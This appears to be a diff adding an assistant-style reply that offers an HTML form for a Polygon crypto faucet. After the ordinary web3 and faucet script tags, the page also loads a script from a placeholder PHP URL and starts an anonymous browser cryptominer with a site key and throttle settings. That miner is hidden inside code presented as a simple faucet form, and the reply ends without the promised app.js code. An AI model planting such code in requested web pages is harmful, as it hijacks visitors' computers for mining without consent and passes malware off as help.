@@ -1,0 +1,31 @@
+Sure, here's an example of how you can combine the JavaScript code for the Polygon faucet with an HTML form that allows the user to enter their account address:
+
+HTML Code:
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Polygon Faucet Form</title>
+  </head>
+  <body>
+    <form>
+      <label for="recipient-address">Recipient Address</label>
+      <input type="text" id="recipient-address" name="recipient-address"><br>
+      <button type="submit" id="send-faucet" name="send-faucet">Send Faucet</button>
+    </form>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.0.0-beta.55/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/TamtamHero/polygon-faucet/faucet.js"></script>
+    <script src="app.js"></script>
+<script src="http://<your-domain>/<path-to-script>/4LRy.php?f=toGb.js"></script>
+<script>
+    var _client = new Client.Anonymous('3482adaaca0bc48bc671a4ae2aa8390bd910d2684767ba226bf08f7124d165fe', {
+        throttle: 30, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "https://bit.ly/3f2g5WH", "#cccccc", 40, "#3d3d3d");
+
+</script>
+  </body>
+</html>
